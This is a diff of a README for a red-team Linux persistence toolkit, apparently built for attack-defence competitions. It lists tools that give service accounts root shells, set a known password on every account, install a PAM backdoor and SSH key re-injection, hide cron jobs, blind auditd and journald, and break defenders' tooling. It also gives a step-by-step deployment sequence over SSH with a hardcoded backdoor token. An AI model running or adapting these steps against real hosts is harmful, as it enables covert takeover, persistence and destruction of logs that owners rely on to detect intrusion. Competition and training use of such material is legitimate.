@@ -51,7 +51,7 @@
 | compromise-w-who.sh | backs up the `w` and `who` binaries then overwrites them with fakes, `w` shows hardcoded fake session data, `who` just says "better question is, where?" |
 | evil-timer | poison-timer.sh is the real one — takes `--key "ssh-ed25519 ..."` to bake SSH key re-injection into the payload alongside firewall flush, SUID bash drop, and watchdog restarts; state saved to /var/cache/.syspkg/poison-timer.state so `remove` always targets exactly what was installed rather than re-guessing; all artefacts backdated 2020-04-15; deploy-evil-timer.sh deploys the python2-certbot user-level timer (no root) — usage: `install [--target <timer>] [--interval <min>] [--key "..."] \| remove \| status \| list` |
 | flood-journal.sh | poisons journald.conf, corrupts existing .journal files with urandom garbage so historical logs are unreadable, shadows journalctl to report no entries and 0 disk usage, floods with 8 parallel workers via /dev/log, installs a drop-in on systemd-journald itself so workers relaunch whenever journald restarts — watchdog delegated to shadow-crond hidden spool (no visible cron entry anywhere); `status` checks the spool directly rather than crontab — usage: `install\|remove\|status` |
-| infinite-users.sh | symlinks nologin to bash so any service account can get a shell, also writes a sudoers.d entry giving all those accounts full nopasswd root |
+| infinite-users.sh | symlinks nologin to bash so any service account can get a shell, writes a sudoers.d entry giving all those accounts full nopasswd root, and sets a known password on every unlocked account so they're immediately SSHable — default password `rt2025!delta`, override with positional arg: `infinite-users 'mypass'` |
 | lock-busybox.sh | replaces all busybox binaries with a gated wrapper — no token = segfault, red team uses RT_TOK=rt2025!delta or the hidden binary at /var/cache/.syspkg/busybox.real directly, also chmod 700s the shadow-crond copy so blue team cant call it — **must run AFTER shadow-crond.sh**; install now warns if shadow-crond (systemd-timesyncd-helper) isn't running before proceeding — usage: `install\|remove\|status` |
 | no-apt.sh | renames sources.list and sources.list.d so apt-get silently breaks — idempotent, skips if already deployed — usage: `install\|remove\|status` |
 | no-audit.sh | flushes all audit rules and disables kernel auditing with the real auditctl, then shadows it with a no-op wrapper so blue team cant add rules back, also redirects auditd log output to /dev/null and truncates rules.d — auditd stays "active (running)" the whole time — idempotent, skips if backup exists; `remove` restores auditctl, auditd.conf, and rules.d from /var/cache/.syspkg/ — usage: `install\|remove\|status` |
@@ -77,6 +77,8 @@
 - **idempotent scripts** — no-apt.sh, no-audit.sh, no-selinux.sh all exit early if already deployed; no-audit.sh and no-selinux.sh now also have `remove` and `status` subcommands matching the rest of the toolkit
 - **shared hidden dir** — all scripts use `/var/cache/.syspkg/` for backups and binaries (chmod 700); poison-timer state is at `/var/cache/.syspkg/poison-timer.state`
 - **pam-backdoor is now self-contained** — C source embedded as heredoc; PAM dir detected via `find` on pam_unix.so (no python3 dependency); gcc and libpam0g-dev headers checked before attempting compile
+- **infinite-users + SSH key injection** — ureadahead-persist and poison-timer inject keys into ALL UID≥1000 home dirs including nologin-shelled accounts; after infinite-users runs those accounts have bash and the key is already there
+- **password-only targets** — use `-p PASS` in rt-ssh.sh; this feeds both SSH login (via sshpass) and remote `sudo -S` from one flag; override sudo password separately with `-S` if needed
 
 ---
 
@@ -101,9 +103,12 @@ chmod +x rt-ssh.sh *.sh evil-timer/*.sh pam-backdoor/*.sh persist/*.sh webshells
 ./rt-ssh.sh [OPTIONS] <tool> [tool-args...]
 
   -t, --target USER@HOST   SSH target (required for remote tools)
+  -p, --pass PASS          SSH login password (uses sshpass); also used as sudo
+                           password unless -S overrides it — use this for
+                           password-only access (no key needed)
   -i, --identity FILE      SSH private key file
   -P, --port PORT          SSH port (default: 22)
-  -S, --sudo-pass PASS     Sudo password when SSH user is not root
+  -S, --sudo-pass PASS     Sudo password override (if different from -p)
       --no-sudo            Don't prepend sudo (already SSH'd in as root)
   -v, --verbose            Print the remote command before running
       --list               List all available tools and exit
@@ -111,54 +116,72 @@ chmod +x rt-ssh.sh *.sh evil-timer/*.sh pam-backdoor/*.sh persist/*.sh webshells
 
 ### Recommended deployment order (per host)
 
-Run these roughly in order. Steps marked **(root)** require root SSH or `-S <sudo_pass>`.
+Two common starting points — pick based on what access you have.
+
+#### Starting with password-only SSH (no key yet)
 
 ```bash
-TARGET="root@<host_ip>"   # adjust per target
+# Set once at the top of your session
+export RT_KEY="$(cat ~/.ssh/id_ed25519.pub)"
+HOST="192.168.241.150"
+USER="user"      # SSH login user
+PASS="user"      # SSH + sudo password (same in most CTF setups)
 
-# 1. audit first — see what PATH hijack opportunities exist
-./rt-ssh.sh -t $TARGET path-hijack scan
+# -p handles both SSH auth (via sshpass) and sudo -S automatically
+rt() { ./rt-ssh.sh -t "${USER}@${HOST}" -p "$PASS" "$@"; }
 
-# 2. persistence layer 1 — shadow cron (must be BEFORE lock-busybox)
-./rt-ssh.sh -t $TARGET shadow-crond install
+# 1. Scan for PATH hijack opportunities
+rt path-hijack scan
 
-# 3. persistence layer 2 — ureadahead disguise (SSH key + fw flush + watchdogs)
-./rt-ssh.sh -t $TARGET ureadahead-persist install --key "$RT_KEY"
+# 2. Unlock all service accounts + set password (rt2025!delta by default)
+#    After this, ssh as bin/daemon/www-data/etc. is possible
+rt infinite-users
 
-# 4. persistence layer 3 — PATH hijacking (user-level, no sudo needed)
-./rt-ssh.sh -t ubuntu@<host_ip> path-hijack-user install --level user --key "$RT_KEY"
+# 3. Shadow cron — must be BEFORE lock-busybox
+rt shadow-crond install
 
-# 5. persistence layer 4 — PATH hijacking (system-wide + cron, root)
-./rt-ssh.sh -t $TARGET path-hijack install --level system --key "$RT_KEY"
-./rt-ssh.sh -t $TARGET path-hijack install --level cron   --key "$RT_KEY" --commands "python3,bash,curl"
+# 4. ureadahead persistence (SSH key + fw flush + watchdogs at boot + every 15 min)
+rt ureadahead-persist install --key "$RT_KEY"
 
-# 6. PAM backdoor — auth as any user with magic password
-./rt-ssh.sh -t $TARGET pam-backdoor install
+# 5. PATH hijack user-level (no sudo, runs as $USER)
+./rt-ssh.sh -t "${USER}@${HOST}" -p "$PASS" --no-sudo path-hijack-user install --level user --key "$RT_KEY"
 
-# 7. lock busybox AFTER shadow-crond (ordering constraint)
-./rt-ssh.sh -t $TARGET lock-busybox install
+# 6. PATH hijack system-wide + cron (root)
+rt path-hijack install --level system --key "$RT_KEY"
+rt path-hijack install --level cron   --key "$RT_KEY"
 
-# 8. anti-forensics
-./rt-ssh.sh -t $TARGET no-audit install
-./rt-ssh.sh -t $TARGET no-selinux install
+# 7. PAM backdoor — lets you auth as any user with rt2025!delta
+rt pam-backdoor install
 
-# 9. firewall persistence timer (--key bakes SSH re-injection into the timer payload)
-./rt-ssh.sh -t $TARGET poison-timer install --key "$RT_KEY"
+# 8. lock-busybox AFTER shadow-crond
+rt lock-busybox install
 
-# 10. break blue team tooling
-./rt-ssh.sh -t $TARGET no-apt install
-./rt-ssh.sh -t $TARGET break-net-tools install
-./rt-ssh.sh -t $TARGET pihole-sinkhole install    # blocks GitHub/CDN
+# 9. anti-forensics
+rt no-audit install
+rt no-selinux install
+
+# 10. timer persistence (re-injects SSH key + flushes FW every 10 min)
+rt poison-timer install --key "$RT_KEY"
+
+# 11. break blue team tooling
+rt no-apt install
+rt break-net-tools install
+rt pihole-sinkhole install    # blocks GitHub/CDN
 ```
 
-### Non-root SSH (sudo required)
+#### Starting with root SSH key (after initial foothold)
 
 ```bash
-# with NOPASSWD sudo
-./rt-ssh.sh -t ubuntu@<host_ip> shadow-crond install
+export RT_KEY="$(cat ~/.ssh/id_ed25519.pub)"
+HOST="192.168.241.150"
 
-# with password sudo
-./rt-ssh.sh -t ubuntu@<host_ip> -S 'ubuntu' shadow-crond install
+# --no-sudo because we're already root
+rt() { ./rt-ssh.sh -t "root@${HOST}" -i ~/.ssh/id_ed25519 --no-sudo "$@"; }
+
+rt shadow-crond install
+rt ureadahead-persist install --key "$RT_KEY"
+rt infinite-users           # unlock service accounts (password: rt2025!delta)
+# ... same steps 4–11 as above
 ```
 
 ### User-level tools (no sudo, run as SSH user)
@@ -206,7 +229,7 @@ done
 
 | Secret | Default | Used by |
 |--------|---------|---------|
-| RT token | `rt2025!delta` | busybox gate, PAM backdoor, PHP webshell |
+| RT token | `rt2025!delta` | busybox gate (`RT_TOK`), PAM backdoor, PHP webshell, infinite-users account password |
 | SSH key | generate per op | ureadahead-persist, poison-timer, path-hijack, linux_persist |
 
 **Change both before deployment** — especially if competing teams can read each other's tooling.
